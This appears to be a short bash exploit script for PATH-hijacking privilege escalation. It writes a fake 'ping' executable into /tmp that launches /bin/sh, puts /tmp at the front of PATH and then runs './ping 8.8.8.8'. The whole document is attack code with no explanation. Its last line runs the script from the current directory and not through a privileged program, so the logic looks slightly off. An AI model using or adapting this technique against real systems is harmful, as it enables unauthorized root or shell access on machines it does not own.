#!/usr/bin/env bash

echo -e '#!/bin/sh\n/bin/sh' > /tmp/ping
chmod +x /tmp/ping
export PATH="/tmp:$PATH"
./ping 8.8.8.8
